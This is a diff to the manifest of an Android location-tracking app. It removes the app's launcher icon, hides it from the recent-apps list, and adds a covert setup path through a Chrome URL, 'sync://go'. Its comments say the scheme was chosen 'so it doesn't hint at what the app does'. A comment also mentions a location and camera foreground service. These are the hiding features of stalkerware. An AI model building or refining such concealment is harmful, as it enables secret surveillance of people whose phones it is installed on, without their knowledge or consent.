@@ -42,35 +42,30 @@
         android:theme="@style/Theme.GPSTracker">
 
         <!--
-            excludeFromRecents + taskAffinity="" means the app never appears
-            in the recent-apps carousel. finishAndRemoveTask() in MainActivity
-            removes the current task immediately after activation.
-        -->
-        <!--
-            MainActivity itself stays ENABLED so it can be started programmatically
-            (e.g. to show a brief status on re-open).  The launcher icon comes
-            entirely from the alias below — disabling the alias removes the icon
-            from every Android launcher, including Samsung One UI, more reliably
-            than disabling the activity itself.
+            NO launcher intent-filter → the app NEVER appears in the app drawer,
+            not even right after installation.
+
+            Setup is triggered by opening Chrome and typing:
+                sync://go
+            in the address bar, then tapping "Open".
+
+            The URL scheme is intentionally generic so it doesn't hint at
+            what the app does.
         -->
         <activity
             android:name=".MainActivity"
-            android:exported="false"
+            android:exported="true"
             android:enabled="true"
             android:excludeFromRecents="true"
-            android:taskAffinity="" />
-
-        <activity-alias
-            android:name=".LauncherAlias"
-            android:targetActivity=".MainActivity"
-            android:enabled="true"
-            android:exported="true"
-            android:excludeFromRecents="true">
+            android:taskAffinity=""
+            android:launchMode="singleTask">
             <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
+                <action android:name="android.intent.action.VIEW" />
+                <category android:name="android.intent.category.DEFAULT" />
+                <category android:name="android.intent.category.BROWSABLE" />
+                <data android:scheme="sync" android:host="go" />
             </intent-filter>
-        </activity-alias>
+        </activity>
 
         <!--
             foregroundServiceType="location|camera" allows the service to use
